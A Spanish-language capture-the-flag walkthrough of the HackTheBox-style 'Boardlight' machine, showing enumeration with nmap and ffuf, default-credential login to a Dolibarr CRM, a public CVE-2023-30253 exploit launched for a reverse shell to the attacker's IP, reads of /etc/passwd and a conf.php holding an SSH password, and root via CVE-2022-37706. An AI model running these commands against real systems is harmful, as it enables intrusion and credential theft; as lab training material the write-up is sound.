Maquina: Boardlight

Autor:

Dificultad: Facil

Iniciamos la máquina y verificamos la conexión

ping 10.129.135.122 -c 1

Enumeramos la maquina con nmap 

nmap -sV 10.129.135.122

En la web muestra 'Bienvenido a BOARDLIGHT' mantenida por Board.htb.

Abrimos el enlace y usamos Ffuf.

ffuf -w /usr/share/wordlists/dirb/big.txt -H "Host:FUZZ.board.htb" -u "http://board.htb/"

Encontramos el archivo index.php por lo que realizamos la búsqueda.

http://crm.board.htb/index.php

Es un panel de login por lo que probamos las credenciales más comunes. Probamos admin tanto para contraseña y usuario y nos deja iniciar sesión correctamente.

Revisamos la versión por Internet si tiene alguna vulnerabilidad. Efectivamente tiene una vulnerabilidad que intentaremos explotar haciendo una Reverse Shell.

"Copiemos esta versión y busquemos el exploit en Google, y encontrarás un exploit CVE-2023–30253.

https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253

Ejecutamos el script mientras nos ponemos en escucha para conectarnos.

python3 exploit.py http://crm.board.htb admin admin 10.10.14.101 4444

nc -lvnp 4444

Revisamos todos los archivos y encontramos la contraseña ssh en el archivo conf.php. Vamos a comprobar el nombre de usuario. 

Vemos que hay un directorio larissa en cd /home/.

cat /etc/passwd | grep bash

cat /var/www/html/crm.board.htb/htdocs/conf/conf.php

Nos conectamos a larissa por ssh con la contrasena encontyrada: serverfun2$2023!!

cat user.txt

SUID exploited using CVE-2022–37706

Utilizamos LinPEAS

Buscamos el código del script en GitHub, lo copiamos y lo pegamos en un nuevo archivo suid.sh en el directorio del usuario Larissa.

nano suid.sh

Para ejecutar el script, necesitamos otorgarle permisos de ejecución

chmod +x suid.sh

Ejecutamos el script 

bash suid.sh & ./exploit.sh

ls

id

cat root.txt


